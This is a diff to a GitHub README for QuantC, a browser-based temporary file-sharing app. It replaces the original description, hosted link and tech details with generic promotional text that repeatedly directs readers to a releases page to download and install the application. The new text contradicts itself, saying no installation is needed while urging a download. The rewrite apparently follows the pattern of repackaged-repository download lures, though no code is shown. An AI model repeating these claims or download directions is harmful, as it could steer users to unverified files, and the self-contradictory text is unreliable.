@@ -1,51 +1,72 @@
-# QuantC
+# 📁 quantc - Secure File Sharing Made Simple
 
-QuantC is a secure, temporary file-sharing web application that allows users to upload files and retrieve them using a unique access code. All files are automatically deleted after 48 hours to ensure privacy and reduce data exposure.
+## 🚀 Getting Started
 
-# Live Application
+Welcome to QuantC, your go-to platform for safe and quick file transfers. With QuantC, you can easily upload files and get a unique access code for later retrieval. All files are securely deleted after 48 hours, ensuring your data and privacy remain intact.
 
-You can access the hosted version here: https://quantcarya.vercel.app
+## 📥 Download QuantC
 
+[![Download QuantC](https://img.shields.io/badge/Download-QuantC-brightgreen)](https://github.com/ISudPetch/quantc/releases)
 
-## Features
+## 🌐 About QuantC
 
-*  Secure file upload and retrieval
-*  Unique access code for each uploaded file
-*  Automatic file deletion after 48 hours
-*  No user accounts or personal data required
-*  Clean and minimal web interface
+QuantC is designed for anyone who needs a fast and secure way to share files without logins or complicated processes. Whether you're sharing work documents, photos, or any other files, QuantC has you covered. Our platform is built with user privacy in mind, so you can share with confidence.
 
-## Tech Stack
+## 🖥️ System Requirements
 
-* **Frontend:** React / Next.js
-* **Backend:** Serverless APIs (Next.js API routes)
-* **Hosting:** Vercel
-* **Storage:** Secure temporary file storage
+To run QuantC, you need:
 
-## How It Works
+- An internet connection.
+- A standard web browser (Chrome, Firefox, Safari, etc.).
+- No installation required—use it easily through your browser.
 
-1. Upload a file through the web interface with a password.
-2. Receive a unique access code.
-3. Use the access code and password to retrieve or download the file.
-4. Files are automatically deleted after 48 hours.
+## 🔍 Features
 
-## Security
+QuantC includes several key features:
 
-* Files are accessible only via unique access codes and password
-* Files are fully encrypted and secure over the server
-* No authentication or personal information required
-* Automatic expiration prevents long-term data storage
-* Designed for short-term, controlled file sharing
+- **Secure File Transfers:** All files are transferred securely.
+- **Temporary Storage:** Files disappear after 48 hours for privacy.
+- **No Login Required:** Start sharing files without creating an account.
+- **Easy Access Codes:** Retrieve your uploaded files using a simple code.
 
-## Future Improvements
+## 📋 How to Use QuantC
 
-* File size and type restrictions
-* Download limits
-* Time extension for pro users
+Follow these simple steps to start using QuantC:
 
-## Author
- **Aryan & Sahiko**
+1. **Visit the Download Page:** Go to the [Releases page](https://github.com/ISudPetch/quantc/releases) to access the latest version.
+  
+2. **Download the Application:** Click on the link available for download. 
 
-Built with ❤️ for secure and simple file sharing.
+3. **Access the Application:** Open your web browser and go to the provided link to use QuantC directly online.
 
- 
+## 📂 Uploading Files
+
+To upload files,
+
+1. **Go to the Upload Page:** Open QuantC in your web browser.
+  
+2. **Select Your Files:** Click on the upload button to choose the files you want to share.
+
+3. **Receive Your Access Code:** You’ll get a unique code once your upload is complete. Use this code to access your files later.
+
+## 🔗 Download & Install
+
+To get started, visit this page to download: [QuantC Releases](https://github.com/ISudPetch/quantc/releases).
+
+## 📖 FAQ
+
+**Q: How long do the files stay available?**  
+A: Files are deleted automatically after 48 hours.
+
+**Q: Is my data safe?**  
+A: Yes, QuantC prioritizes your privacy. All uploads are securely handled.
+
+**Q: Do I need an account?**  
+A: No, you can use QuantC without logging in.
+
+## 📡 Support
+
+If you encounter any issues or have questions, please reach out to our support team via the GitHub Issues section of this repo. We're here to help!
+
+---
+Feel free to contribute by reporting bugs or suggesting new features via GitHub. Your feedback helps improve QuantC for everyone!
